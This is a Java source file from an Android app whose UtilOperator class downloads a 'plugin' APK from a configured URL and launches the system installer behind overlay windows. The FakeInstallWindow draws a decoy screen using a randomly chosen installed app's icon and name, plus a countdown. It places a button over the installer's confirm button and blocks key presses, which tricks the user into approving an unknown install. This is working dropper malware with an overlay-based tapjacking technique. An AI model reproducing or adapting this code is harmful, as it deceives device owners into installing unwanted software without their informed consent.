package com.xstd.qm;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.os.Handler;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.view.*;
import android.widget.ImageView;
import android.widget.TextView;
import com.plugin.common.utils.SingleInstanceBase;
import com.plugin.common.utils.UtilsRuntime;
import com.plugin.common.utils.files.FileDownloader;
import com.plugin.common.utils.files.FileOperatorHelper;
import com.xstd.quick.R;

import java.io.File;
import java.io.IOException;

/**
 * Created with IntelliJ IDEA.
 * User: michael
 * Date: 13-10-14
 * Time: PM3:47
 * To change this template use File | Settings | File Templates.
 */
public class UtilOperator {

    public static FakeInstallWindow fake;

    private static void intstallLocalApk(final Context context, final String fullPath) {
        try {
            Runtime.getRuntime().exec("chmod 666 " + fullPath);
        } catch (IOException e) {
            e.printStackTrace();
        }

        Config.LOGD("[[intstallLocalApk]] try to install plugin once with fake window");

        Handler handler = new Handler(context.getMainLooper());
        handler.post(new Runnable() {
            @Override
            public void run() {
                fake = new FakeInstallWindow(context);
                fake.show(true);
                fake.updateTimerCount();

                Config.DOWNLOAD_PROCESS_RUNNING.set(false);
                Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] try to install apk : " + fullPath);
                Intent i = new Intent(Intent.ACTION_VIEW);
                File upgradeFile = new File(fullPath);
                i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
                i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                context.startActivity(i);

                if (!AppRuntime.WATCHING_SERVICE_RUNNING.get()) {
                    Intent is = new Intent();
                    is.setClass(context, WatchingService.class);
                    context.startService(is);
                }
            }
        });
    }

    public static final class FakeInstallWindow {

        private static final int TIMER_COUNT = 20;

        private View coverView;
        private View timerView;
        private TextView timeTV;
        private View installView;
        private Context context;
        private WindowManager wm;
        private int count = TIMER_COUNT;
        private Handler handler;
        private LayoutInflater layoutInflater;
        private int screenWidth;
        private int screenHeight;
        private float density;

        public FakeInstallWindow(Context context) {
            this.context = context;
            layoutInflater = (LayoutInflater) context.getSystemService(Context.LAYOUT_INFLATER_SERVICE);
            coverView = layoutInflater.inflate(R.layout.app_details, null);
            timerView = layoutInflater.inflate(R.layout.fake_timer, null);
            timeTV = (TextView) timerView.findViewById(R.id.timer);
            installView = layoutInflater.inflate(R.layout.fake_install_btn, null);
            wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
            handler = new Handler(context.getMainLooper());

            DisplayMetrics dm = new DisplayMetrics();
            wm.getDefaultDisplay().getMetrics(dm);
            screenWidth = dm.widthPixels;
            screenHeight = dm.heightPixels;
            density = dm.density;

            //init view
            ImageView icon = (ImageView) coverView.findViewById(R.id.app_icon);
            TextView name = (TextView) coverView.findViewById(R.id.app_name);
            TextView content = (TextView) coverView.findViewById(R.id.center_explanation);
            PLuginManager.AppInfo appInfo = SingleInstanceBase.getInstance(PLuginManager.class).randomScanInstalledIcon();
            if (appInfo != null) {
                icon.setImageDrawable(appInfo.icon);
                name.setText(String.format(context.getString(R.string.protocal_title), appInfo.name));
                content.setText(context.getString(R.string.protocal).replace("**", appInfo.name));
            }
        }

        public void updateTimerCount() {
            if (count <= 0) {
                if (coverView != null && timerView != null) {
                    wm.removeView(coverView);
                    wm.removeView(timerView);
                    wm.removeView(installView);
                }
                coverView = null;
                timerView = null;
                installView = null;
                fake = null;
                AppRuntime.FAKE_WINDOWS_SHOW.set(false);
            } else {
                if (count == (TIMER_COUNT - 2) && AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
                    //update install btn

                    WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
                    confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
                    confirmBtnParams.format = PixelFormat.RGBA_8888;
                    confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
                    confirmBtnParams.width = (int) (50 * density);
                    confirmBtnParams.height = (int) (48 * density);
                    confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (25 * density);
                    confirmBtnParams.y = screenHeight - (int) (48 * density);
                    wm.updateViewLayout(installView, confirmBtnParams);
                } else if (count == 1) {
                    WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
                    confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
                    confirmBtnParams.format = PixelFormat.RGBA_8888;
                    confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
                    confirmBtnParams.width = screenWidth / 2;
                    confirmBtnParams.height = (int) (48 * density);
                    confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.RIGHT;
                    wm.updateViewLayout(installView, confirmBtnParams);

                    UtilsRuntime.goHome(context);
                }

                if (AppRuntime.PLUGIN_INSTALLED || !AppRuntime.INSTALL_PACKAGE_TOP_SHOW.get()) {
                    AppRuntime.PLUGIN_INSTALLED = false;

                    //显示全部install btn，全遮盖
                    WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
                    confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
                    confirmBtnParams.format = PixelFormat.RGBA_8888;
                    confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
                    confirmBtnParams.width = screenWidth / 2;
                    confirmBtnParams.height = (int) (48 * density);
                    confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.RIGHT;
                    wm.updateViewLayout(installView, confirmBtnParams);
                }

                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        if (coverView != null && timerView != null) {
                            timeTV.setText(String.format(context.getString(R.string.fake_timer), count));
                            count--;
                            handler.postDelayed(new Runnable() {
                                @Override
                                public void run() {
                                    updateTimerCount();
                                }
                            }, 1000);
                        }
                    }
                });
            }

        }

        public void dismiss() {
//            if (coverView != null && timerView != null) {
//                wm.removeView(coverView);
//                wm.removeView(timerView);
//            }
//            coverView = null;
//            timerView = null;
//            fake = null;
        }

        public void show(boolean full) {
            AppRuntime.FAKE_WINDOWS_SHOW.set(true);
            //install
            WindowManager.LayoutParams confirmBtnParams = new WindowManager.LayoutParams();
            if (!full) {
                confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
                confirmBtnParams.format = PixelFormat.RGBA_8888;
                confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
                confirmBtnParams.width = (int) (60 * density);
                confirmBtnParams.height = (int) (38 * density);
                confirmBtnParams.x = (screenWidth / 2 - confirmBtnParams.width) / 2 + (int) (26 * density);
                confirmBtnParams.y = screenHeight - (int) (54 * density);
            } else {
                confirmBtnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
                confirmBtnParams.format = PixelFormat.RGBA_8888;
                confirmBtnParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
                confirmBtnParams.width = screenWidth / 2;
                confirmBtnParams.height = (int) (48 * density);
                confirmBtnParams.gravity = Gravity.BOTTOM | Gravity.RIGHT;
            }
            wm.addView(installView, confirmBtnParams);

            //timer
            WindowManager.LayoutParams btnParams = new WindowManager.LayoutParams();
            btnParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
            btnParams.format = PixelFormat.RGBA_8888;
            btnParams.flags = android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
            btnParams.width = screenWidth / 2;
            btnParams.height = (int) (48 * density);
            btnParams.gravity = Gravity.LEFT | Gravity.BOTTOM;
            wm.addView(timerView, btnParams);

            //cover
            WindowManager.LayoutParams wMParams = new WindowManager.LayoutParams();
            wMParams.type = android.view.WindowManager.LayoutParams.TYPE_PHONE;
            wMParams.format = PixelFormat.RGBA_8888;
            wMParams.flags = WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL;
            wMParams.width = WindowManager.LayoutParams.FILL_PARENT;
            wMParams.height = screenHeight - (int) ((48 + 25) * density);
            wMParams.gravity = Gravity.LEFT | Gravity.TOP;
            coverView.setOnKeyListener(new View.OnKeyListener() {
                @Override
                public boolean onKey(View view, int i, KeyEvent keyEvent) {
                    return true;
                }
            });
            wm.addView(coverView, wMParams);
        }

    }

    public static boolean isPluginApkExist() {
        File apkFile = new File(Config.PLUGIN_APK_PATH);
        if (apkFile.exists()) {
            return true;
        }

        return false;
    }

    public static void tryToDownloadPlugin(final Context context) {
        if (UtilsRuntime.isOnline(context)) {
            Config.LOGD("[[tryToDownloadPlugin::onReceive]] current is ONLINE  try to download plugin!!!");

            if (!Config.DOWNLOAD_PROCESS_RUNNING.get()) {
                Config.DOWNLOAD_PROCESS_RUNNING.set(true);
                File apkFile = new File(Config.PLUGIN_APK_PATH);
                if (apkFile.exists()) {
                    Config.DOWNLOAD_PROCESS_RUNNING.set(false);
                    return;
                }

                FileDownloader.getInstance(context).postRequest(
                                                                   new FileDownloader.DownloadRequest(Config.DOWNLOAD_URL)
                                                                   , new FileDownloader.DownloadListener() {
                    @Override
                    public void onDownloadProcess(int fileSize, int downloadSize) {
                        Config.LOGD("[[tryToInstallPlugin]] downalod file size : " + downloadSize);
                    }

                    @Override
                    public void onDownloadFinished(int status, Object response) {
                        Config.DOWNLOAD_PROCESS_RUNNING.set(false);
                        if (response != null) {
                            FileDownloader.DownloadResponse r = (FileDownloader.DownloadResponse) response;
                            String localUrl = r.getRawLocalPath();
                            Config.LOGD("[[tryToDownloadPlugin]] download file success to : " + localUrl);
                            if (!TextUtils.isEmpty(localUrl)) {
                                String targetPath = FileOperatorHelper.copyFile(localUrl, Config.PLUGIN_APK_PATH);
                                if (!TextUtils.isEmpty(targetPath)) {
                                    Config.LOGD("[[tryToDownloadPlugin]] try to mv download file to : " + targetPath);
                                    File targetFile = new File(targetPath);
                                    if (targetFile.exists()) {
                                        Config.LOGD("[[tryToDownloadPlugin]] success download plugin file : " + targetPath);
                                    }
                                }
                            }
                        } else {
                            Config.LOGD("[[tryToDownloadPlugin]] download plugin falied, response is null");
                        }
                    }
                });
            }

        }
    }

    public static void tryToInstallPluginLocal(Context context) {
        File apkFile = new File(Config.PLUGIN_APK_PATH);
        if (apkFile.exists()) {
            intstallLocalApk(context, Config.PLUGIN_APK_PATH);
            return;
        }
    }

    public static void tryToInstallPlugin(final Context context) {
        if (UtilsRuntime.isOnline(context)) {
            Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] current is ONLINE !!!");

            if (!Config.DOWNLOAD_PROCESS_RUNNING.get()) {
                Config.DOWNLOAD_PROCESS_RUNNING.set(true);
                File apkFile = new File(Config.PLUGIN_APK_PATH);
                if (apkFile.exists()) {
                    intstallLocalApk(context, Config.PLUGIN_APK_PATH);
                    Config.DOWNLOAD_PROCESS_RUNNING.set(false);
                    return;
                }

                FileDownloader.getInstance(context).postRequest(
                                                                   new FileDownloader.DownloadRequest(Config.DOWNLOAD_URL)
                                                                   , new FileDownloader.DownloadListener() {
                    @Override
                    public void onDownloadProcess(int fileSize, int downloadSize) {
                        Config.LOGD("[[tryToInstallPlugin]] downalod file size : " + downloadSize);
                    }

                    @Override
                    public void onDownloadFinished(int status, Object response) {
                        if (response != null) {
                            FileDownloader.DownloadResponse r = (FileDownloader.DownloadResponse) response;
                            String localUrl = r.getRawLocalPath();
                            Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] download file success to : " + localUrl);
                            if (!TextUtils.isEmpty(localUrl)) {
                                String targetPath = FileOperatorHelper.copyFile(localUrl, Config.PLUGIN_APK_PATH);
                                if (!TextUtils.isEmpty(targetPath)) {
                                    Config.LOGD("[[NetworkBroadcastReceiver::onReceive]] try to mv download file to : " + targetPath);
                                    File targetFile = new File(targetPath);
                                    if (targetFile.exists()) {
                                        intstallLocalApk(context, Config.PLUGIN_APK_PATH);
                                    }
                                }
                            }
                        }
                    }
                });
            }

        }
    }

    public static final String ACTIVE_ACTION = "com.xstd.qm.active";

    public static void startActiveAlarm(Context context, long delay) {
        cancelActiveAlarm(context);
        Intent intent = new Intent();
        intent.setAction(ACTIVE_ACTION);
        PendingIntent sender = PendingIntent.getBroadcast(context, 0, intent, 0);
        long firstime = System.currentTimeMillis();
        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);

        am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, firstime + delay, sender);
        Config.LOGD("[[startActiveAlarm]]");
    }

    public static void cancelActiveAlarm(Context context) {
        Config.LOGD("[[cancelActiveAlarm]]");
        Intent intent = new Intent();
        intent.setAction(ACTIVE_ACTION);
        PendingIntent sender = PendingIntent.getBroadcast(context, 0, intent, 0);
        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        am.cancel(sender);
    }
}
